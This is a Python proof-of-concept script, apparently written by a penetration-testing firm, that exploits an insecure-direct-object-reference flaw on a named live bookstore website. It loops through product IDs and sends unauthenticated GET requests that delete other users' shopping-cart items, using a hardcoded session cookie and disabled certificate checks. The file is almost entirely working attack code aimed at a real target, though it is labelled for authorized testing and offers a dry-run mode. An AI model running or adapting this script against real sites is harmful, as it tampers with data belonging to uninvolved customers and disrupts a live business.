#!/usr/bin/env python3
"""
POC: Cart Delete IDOR via GET Request
Target: https://webservices.advanceware.net/gironbooksb2c/
Finding: A01 Broken Access Control / A04 Insecure Design
Severity: High

AUTHORIZED SECURITY TESTING ONLY
Prepared by: FraterIT Enterprises

How the vulnerability works:
  The Remove button calls: ShoppingCart.aspx?id=ProdId&Delete=True&CombId=0
  This is a plain GET request — no CSRF token, no POST, no ownership check.
  Any script can loop through IDs and delete other users cart items.

Usage:
  # Dry run (safe — only checks IDs, deletes nothing)
  python3 poc_cart_delete_idor.py --dry-run

  # Live run (actually sends delete requests — authorized testing only)
  python3 poc_cart_delete_idor.py --live
"""

import requests
import argparse
import time
import urllib3

urllib3.disable_warnings()

# ── CONFIG ────────────────────────────────────────────────────────────────────
TARGET      = "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx"
SESSION     = "y3u3l2tsaw2fyaj0lnykd5yh"   # replace with live session before running
KNOWN_ID    = 1120536                        # confirmed ProdId from testing
ID_RANGE    = range(KNOWN_ID - 20, KNOWN_ID + 20)
BURP_PROXY  = {"https": "http://127.0.0.1:8080"}   # routes through Burp for capture
DELAY       = 0.5                            # seconds between requests (be polite)
# ──────────────────────────────────────────────────────────────────────────────

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Cookie": f"ASP.NET_SessionId={SESSION}",
}


def check_id(session, prod_id, dry_run=True):
    """
    Dry run:  GET ShoppingCart.aspx?id=X  (no Delete flag — just checks if ID exists)
    Live run: GET ShoppingCart.aspx?id=X&Delete=True&CombId=0  (actually deletes)
    """
    if dry_run:
        url = f"{TARGET}?id={prod_id}"
    else:
        url = f"{TARGET}?id={prod_id}&Delete=True&CombId=0"

    try:
        resp = session.get(url, headers=HEADERS, verify=False,
                           proxies=BURP_PROXY, timeout=10, allow_redirects=True)

        size      = len(resp.text)
        has_item  = str(prod_id) in resp.text
        mode_tag  = "[DRY RUN]" if dry_run else "[LIVE DELETE]"

        status = "FOUND" if has_item else "empty/not found"
        print(f"{mode_tag} id={prod_id} → HTTP {resp.status_code} | "
              f"{size} bytes | {status}")

        return has_item, resp

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] id={prod_id} → {e}")
        return False, None


def main():
    parser = argparse.ArgumentParser(description="Cart IDOR PoC")
    group  = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--dry-run", action="store_true",
                       help="Safe mode: checks IDs without deleting")
    group.add_argument("--live",    action="store_true",
                       help="Live mode: sends Delete=True (authorized testing only)")
    args = parser.parse_args()

    dry_run = args.dry_run

    print("=" * 60)
    print("FraterIT Enterprises — Cart Delete IDOR PoC")
    print(f"Target : {TARGET}")
    print(f"Mode   : {'DRY RUN (read-only)' if dry_run else '*** LIVE DELETE ***'}")
    print(f"IDs    : {min(ID_RANGE)} to {max(ID_RANGE)}")
    print("=" * 60)

    if not dry_run:
        confirm = input("\nWARNING: This will delete cart items. "
                        "Type YES to confirm: ")
        if confirm.strip() != "YES":
            print("Aborted.")
            return

    session = requests.Session()
    hits    = []

    for prod_id in ID_RANGE:
        found, resp = check_id(session, prod_id, dry_run=dry_run)
        if found:
            hits.append(prod_id)
        time.sleep(DELAY)

    print("\n" + "=" * 60)
    print(f"SUMMARY: {len(hits)} ID(s) returned a match out of "
          f"{len(ID_RANGE)} tested")
    if hits:
        print(f"IDs with activity: {hits}")
    print("=" * 60)

    # Report output
    print("\n[REPORT EVIDENCE]")
    print(f"Vulnerability: Cart items deleted via unauthenticated GET request")
    print(f"Proof        : {len(hits)} ProdId(s) found/affected in range "
          f"{min(ID_RANGE)}-{max(ID_RANGE)}")
    print(f"No login required. No CSRF token required.")
    print(f"At scale, attacker loops through all IDs and empties every active cart.")


if __name__ == "__main__":
    main()
